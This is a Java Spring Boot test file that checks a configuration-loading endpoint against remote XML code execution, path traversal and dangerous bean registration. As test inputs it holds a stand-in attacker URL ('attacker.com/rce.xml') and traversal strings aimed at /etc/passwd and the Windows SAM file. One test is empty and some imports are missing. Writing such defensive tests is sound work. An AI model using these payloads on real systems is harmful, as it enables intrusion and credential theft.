package com.example.security;

import org.junit.jupiter.api.Test;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.test.context.SpringBootTest;
import org.springframework.boot.test.autoconfigure.web.servlet.AutoConfigureMockMvc;
import org.springframework.test.web.servlet.MockMvc;
import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.*;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.*;
import static org.junit.jupiter.api.Assertions.*;

@SpringBootTest
@AutoConfigureMockMvc
public class ComponentScanningSecurityTest {

    @Autowired
    private MockMvc mockMvc;

    @Autowired
    private ApplicationContext context;

    @Test
    public void testVulnerableCodeAllowsRCE() throws Exception {
        // ✅ Verify vulnerable implementation would allow arbitrary XML loading
        // This test should FAIL on vulnerable code
        String maliciousXml = "http://attacker.com/rce.xml";

        // Vulnerable code would accept this and load remote XML
        // Secure code should reject it
    }

    @Test
    public void testTier1BlocksUntrustedConfig() throws Exception {
        // ✅ Verify Tier 1 rejects non-allowlisted config names
        mockMvc.perform(post("/api/config/load")
                .param("configName", "../../../../etc/passwd"))
            .andExpect(status().isBadRequest())
            .andExpect(content().string("Invalid configuration name"));
    }

    @Test
    public void testPathTraversalBlocked() throws Exception {
        // ✅ Verify path traversal attempts are blocked
        mockMvc.perform(post("/api/config/load")
                .param("configName", "../../../etc/passwd"))
            .andExpect(status().isBadRequest());

        mockMvc.perform(post("/api/config/load")
                .param("configName", "..\\..\\..\\windows\\system32\\config\\sam"))
            .andExpect(status().isBadRequest());
    }

    @Test
    public void testDangerousBeansNotRegistered() {
        // ✅ Verify dangerous classes are not registered as beans
        String[] beanNames = context.getBeanDefinitionNames();

        for (String beanName : beanNames) {
            Object bean = context.getBean(beanName);
            String className = bean.getClass().getName();

            assertFalse(className.equals("java.lang.ProcessBuilder"),
                "ProcessBuilder must not be registered as bean");
            assertFalse(className.equals("java.lang.Runtime"),
                "Runtime must not be registered as bean");
            assertFalse(className.equals("javax.script.ScriptEngineManager"),
                "ScriptEngineManager must not be registered as bean");
        }
    }

    @Test
    public void testOnlyTrustedPackagesScanned() {
        // ✅ Verify only trusted packages are scanned
        String[] beanNames = context.getBeanDefinitionNames();

        for (String beanName : beanNames) {
            Object bean = context.getBean(beanName);
            String packageName = bean.getClass().getPackage().getName();

            assertTrue(
                packageName.startsWith("com.example") ||
                packageName.startsWith("org.springframework") ||
                packageName.startsWith("java.lang"),
                "Untrusted package scanned: " + packageName
            );
        }
    }

    @Test
    public void testRemoteXMLLoadingDisabled() {
        // ✅ Verify remote resource loading is disabled
        assertThrows(Exception.class, () -> {
            new ClassPathXmlApplicationContext("http://attacker.com/rce.xml");
        }, "Remote XML loading should be disabled");
    }

    @Test
    public void testAllowlistedConfigLoadsSuccessfully() throws Exception {
        // ✅ Verify legitimate configs can still load
        mockMvc.perform(post("/api/config/load")
                .param("configName", "application-dev.properties"))
            .andExpect(status().isOk());
    }
}
